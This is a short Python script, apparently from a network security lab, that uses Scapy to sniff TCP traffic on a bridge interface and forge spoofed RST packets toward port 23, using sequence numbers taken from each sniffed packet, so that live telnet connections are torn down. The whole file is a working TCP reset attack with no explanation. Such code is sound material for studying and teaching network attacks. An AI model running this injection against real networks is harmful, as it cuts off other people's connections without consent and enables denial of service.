from scapy.all import *

def rstfunc(pkt):
    ip = IP(src=pkt['IP'].src, dst=pkt['IP'].dst)
    len_pkt = 0 if not pkt['TCP'].payload else len(pkt['TCP'].payload.load)
    tcp = TCP(sport=pkt['TCP'].sport, dport=23, flags="R", seq=(pkt['TCP'].seq + len_pkt))
    pkt = ip/tcp
    ls(pkt)
    send(pkt, verbose=0)

f = "tcp and not ether src 02:42:fa:a7:22:45" # Excluding our own generated packets.
pkt = sniff(iface="br-fa4ab2f34bed", filter=f, prn=rstfunc)